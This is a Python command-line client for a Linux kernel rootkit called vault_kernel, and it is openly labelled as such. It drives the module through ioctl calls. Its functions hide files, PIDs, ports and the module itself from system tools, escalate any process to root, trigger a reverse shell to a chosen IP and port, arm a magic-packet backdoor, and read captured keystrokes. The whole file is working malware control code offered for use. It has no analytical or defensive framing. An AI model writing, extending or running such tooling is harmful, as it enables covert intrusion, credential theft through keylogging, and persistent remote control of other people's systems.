#!/usr/bin/env python3
"""
vault_kernel CLI — Userspace client for the vault_kernel kernel rootkit
ruby570bocadito © 2026

Usage:
    python3 vault_kernel_cli.py <command> [args...]

Commands:
    hide-file <name>      Hide a file/directory from ls, find, stat
    unhide-file <name>    Reveal a previously hidden file/directory
    hide-pid <pid>        Hide a process from ps, top, /proc
    unhide-pid <pid>      Reveal a hidden process
    hide-port <port>      Hide a TCP/UDP port from netstat, ss
    unhide-port <port>    Reveal a hidden port
    list                  List all hidden items (PIDs, files, ports)
    give-root [pid]       Escalate a process to root (default: self)
    shell <ip:port>       Trigger reverse shell to remote host
    magic <word>          Set magic packet trigger word
    keylog                Read captured keystrokes
    keylog-clear          Clear the keylogger buffer
    hide-module           Hide rootkit from lsmod
    unhide-module         Make rootkit visible in lsmod
    status                Check if rootkit is loaded and show info
"""

import os
import sys
import struct
import fcntl
import ctypes
import argparse

MAGIC = 0xC0
DEVICE_PATH = "/dev/vault_kernel"

# Standard Linux ioctl layout (uapi/asm-generic/ioctl.h):
#   bits 31:30 = direction  (0=none, 1=write, 2=read)
#   bits 29:16 = argument size
#   bits 15:8  = type (magic number)
#   bits 7:0   = command number

def _IOC(dir, type, nr, size):
    return (dir << 30) | (size << 16) | (type << 8) | nr

def _IO(type, nr):
    return _IOC(0, type, nr, 0)

def _IOW(type, nr, size):
    return _IOC(1, type, nr, size)

def _IOR(type, nr, size):
    return _IOC(2, type, nr, size)

IOCTL_GIVE_ROOT       = _IO(MAGIC, 0x01)
IOCTL_HIDE_FILE       = _IOW(MAGIC, 0x02, 256)
IOCTL_UNHIDE_FILE     = _IOW(MAGIC, 0x03, 256)
IOCTL_HIDE_PID        = _IOW(MAGIC, 0x04, 4)
IOCTL_UNHIDE_PID      = _IOW(MAGIC, 0x05, 4)
IOCTL_HIDE_PORT       = _IOW(MAGIC, 0x06, 2)
IOCTL_UNHIDE_PORT     = _IOW(MAGIC, 0x07, 2)
IOCTL_LIST_HIDDEN     = _IOR(MAGIC, 0x08, 4096)
IOCTL_KEYLOG_READ     = _IOR(MAGIC, 0x09, 4096)
IOCTL_KEYLOG_CLEAR    = _IO(MAGIC, 0x0A)
IOCTL_BACKDOOR_SHELL  = _IOW(MAGIC, 0x0B, 256)
IOCTL_BACKDOOR_MAGIC  = _IOW(MAGIC, 0x0C, 16)
IOCTL_MODULE_HIDE     = _IO(MAGIC, 0x0D)
IOCTL_MODULE_UNHIDE   = _IO(MAGIC, 0x0E)


class RooteameClient:
    def __init__(self):
        self.fd = None

    def _open(self):
        if self.fd is not None:
            return
        self.fd = os.open(DEVICE_PATH, os.O_RDWR)

    def _close(self):
        if self.fd is not None:
            os.close(self.fd)
            self.fd = None

    def give_root(self, pid=0):
        """Escalate a process to root. pid=0 means current process."""
        self._open()
        pid_buf = struct.pack("i", pid)
        try:
            fcntl.ioctl(self.fd, IOCTL_GIVE_ROOT, pid_buf)
            print(f"[+] Granted root to PID {pid if pid else os.getpid()}")
        except PermissionError:
            print("[-] Permission denied. Run as root.")
        self._close()

    def hide_file(self, name):
        self._open()
        buf = name.encode().ljust(256, b'\x00')
        try:
            fcntl.ioctl(self.fd, IOCTL_HIDE_FILE, buf)
            print(f"[+] Hiding file/dir: {name}")
        except PermissionError:
            print("[-] Permission denied. Run with sudo.")
        self._close()

    def unhide_file(self, name):
        self._open()
        buf = name.encode().ljust(256, b'\x00')
        try:
            fcntl.ioctl(self.fd, IOCTL_UNHIDE_FILE, buf)
            print(f"[-] Revealed: {name}")
        except PermissionError:
            print("[-] Permission denied. Run with sudo.")
        self._close()

    def hide_pid(self, pid):
        self._open()
        pid_buf = struct.pack("i", pid)
        try:
            fcntl.ioctl(self.fd, IOCTL_HIDE_PID, pid_buf)
            print(f"[+] Hiding PID: {pid}")
        except PermissionError:
            print("[-] Permission denied. Run with sudo.")
        self._close()

    def unhide_pid(self, pid):
        self._open()
        pid_buf = struct.pack("i", pid)
        try:
            fcntl.ioctl(self.fd, IOCTL_UNHIDE_PID, pid_buf)
            print(f"[-] Revealed PID: {pid}")
        except PermissionError:
            print("[-] Permission denied. Run with sudo.")
        self._close()

    def hide_port(self, port):
        self._open()
        port_buf = struct.pack("H", port)
        try:
            fcntl.ioctl(self.fd, IOCTL_HIDE_PORT, port_buf)
            print(f"[+] Hiding port: {port}")
        except PermissionError:
            print("[-] Permission denied. Run with sudo.")
        self._close()

    def unhide_port(self, port):
        self._open()
        port_buf = struct.pack("H", port)
        try:
            fcntl.ioctl(self.fd, IOCTL_UNHIDE_PORT, port_buf)
            print(f"[-] Revealed port: {port}")
        except PermissionError:
            print("[-] Permission denied. Run with sudo.")
        self._close()

    def list_hidden(self):
        self._open()
        buf = bytearray(4096)
        try:
            fcntl.ioctl(self.fd, IOCTL_LIST_HIDDEN, buf)
            output = buf.rstrip(b'\x00').decode(errors='replace')
            print(output if output else "(nothing hidden)")
        except PermissionError:
            print("[-] Permission denied. Run with sudo.")
        self._close()

    def shell(self, target):
        """Trigger reverse shell to IP:PORT."""
        self._open()
        buf = target.encode().ljust(256, b'\x00')
        try:
            fcntl.ioctl(self.fd, IOCTL_BACKDOOR_SHELL, buf)
            print(f"[+] Reverse shell triggered — connecting to {target}")
        except PermissionError:
            print("[-] Permission denied. Run with sudo.")
        self._close()

    def set_magic(self, word):
        """Set magic packet trigger word for kill() backdoor."""
        self._open()
        buf = word.encode().ljust(16, b'\x00')
        try:
            fcntl.ioctl(self.fd, IOCTL_BACKDOOR_MAGIC, buf)
            print(f"[+] Magic packet backdoor enabled: '{word}'")
        except PermissionError:
            print("[-] Permission denied. Run with sudo.")
        self._close()

    def keylog_read(self):
        """Read captured keystrokes."""
        self._open()
        buf = bytearray(4096)
        try:
            fcntl.ioctl(self.fd, IOCTL_KEYLOG_READ, buf)
            output = buf.rstrip(b'\x00').decode(errors='replace')
            print(f"[*] Keystroke log:\n{output}" if output else "[*] (no keystrokes captured)")
        except PermissionError:
            print("[-] Permission denied. Run with sudo.")
        self._close()

    def keylog_clear(self):
        """Clear keylogger buffer."""
        self._open()
        try:
            fcntl.ioctl(self.fd, IOCTL_KEYLOG_CLEAR)
            print("[+] Keylogger buffer cleared")
        except PermissionError:
            print("[-] Permission denied. Run with sudo.")
        self._close()

    def hide_module(self):
        """Hide the rootkit from lsmod."""
        self._open()
        try:
            fcntl.ioctl(self.fd, IOCTL_MODULE_HIDE)
            print("[+] Module hidden from lsmod")
        except PermissionError:
            print("[-] Permission denied. Run with sudo.")
        self._close()

    def unhide_module(self):
        """Make the rootkit visible in lsmod."""
        self._open()
        try:
            fcntl.ioctl(self.fd, IOCTL_MODULE_UNHIDE)
            print("[-] Module visible again in lsmod")
        except PermissionError:
            print("[-] Permission denied. Run with sudo.")
        self._close()

    def status(self):
        """Check if rootkit is loaded."""
        if os.path.exists(DEVICE_PATH):
            print(f"[*] vault_kernel kernel module is LOADED")
            print(f"    Device: {DEVICE_PATH}")
            try:
                import subprocess
                result = subprocess.run(['modinfo', 'vault_kernel'],
                                        capture_output=True, text=True)
                if result.returncode == 0:
                    for line in result.stdout.splitlines():
                        if 'version' in line.lower() or 'author' in line.lower() or \
                           'description' in line.lower():
                            print(f"    {line.strip()}")
            except Exception:
                pass
        else:
            print("[*] vault_kernel kernel module is NOT loaded")
            print(f"    Run: sudo insmod vault_kernel.ko")


def main():
    parser = argparse.ArgumentParser(
        description="vault_kernel CLI — kernel rootkit control",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )
    subparsers = parser.add_subparsers(dest="command", help="Available commands")

    subparsers.add_parser("status", help="Check if rootkit is loaded")

    sp = subparsers.add_parser("give-root", help="Escalate process to root")
    sp.add_argument("pid", nargs="?", type=int, default=0,
                    help="Target PID (default: self)")

    sp = subparsers.add_parser("hide-file", help="Hide a file/directory")
    sp.add_argument("name", help="File or directory name")

    sp = subparsers.add_parser("unhide-file", help="Reveal a hidden file/directory")
    sp.add_argument("name", help="File or directory name")

    sp = subparsers.add_parser("hide-pid", help="Hide a process")
    sp.add_argument("pid", type=int, help="Process ID")

    sp = subparsers.add_parser("unhide-pid", help="Reveal a hidden process")
    sp.add_argument("pid", type=int, help="Process ID")

    sp = subparsers.add_parser("hide-port", help="Hide a TCP/UDP port")
    sp.add_argument("port", type=int, help="Port number")

    sp = subparsers.add_parser("unhide-port", help="Reveal a hidden port")
    sp.add_argument("port", type=int, help="Port number")

    subparsers.add_parser("list", help="List all hidden items")

    sp = subparsers.add_parser("shell", help="Trigger reverse shell")
    sp.add_argument("target", help="IP:PORT for reverse shell")

    sp = subparsers.add_parser("magic", help="Set magic packet trigger word")
    sp.add_argument("word", help="Trigger word")

    subparsers.add_parser("keylog", help="Read captured keystrokes")
    subparsers.add_parser("keylog-clear", help="Clear keylogger buffer")
    subparsers.add_parser("hide-module", help="Hide from lsmod")
    subparsers.add_parser("unhide-module", help="Reveal in lsmod")

    args = parser.parse_args()

    if args.command is None:
        parser.print_help()
        sys.exit(1)

    if os.geteuid() != 0:
        print("[!] Warning: not running as root. Some commands may fail.")

    client = RooteameClient()

    try:
        if args.command == "status":
            client.status()
        elif args.command == "give-root":
            client.give_root(args.pid)
        elif args.command == "hide-file":
            client.hide_file(args.name)
        elif args.command == "unhide-file":
            client.unhide_file(args.name)
        elif args.command == "hide-pid":
            client.hide_pid(args.pid)
        elif args.command == "unhide-pid":
            client.unhide_pid(args.pid)
        elif args.command == "hide-port":
            client.hide_port(args.port)
        elif args.command == "unhide-port":
            client.unhide_port(args.port)
        elif args.command == "list":
            client.list_hidden()
        elif args.command == "shell":
            client.shell(args.target)
        elif args.command == "magic":
            client.set_magic(args.word)
        elif args.command == "keylog":
            client.keylog_read()
        elif args.command == "keylog-clear":
            client.keylog_clear()
        elif args.command == "hide-module":
            client.hide_module()
        elif args.command == "unhide-module":
            client.unhide_module()
    except Exception as e:
        print(f"[-] Error: {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
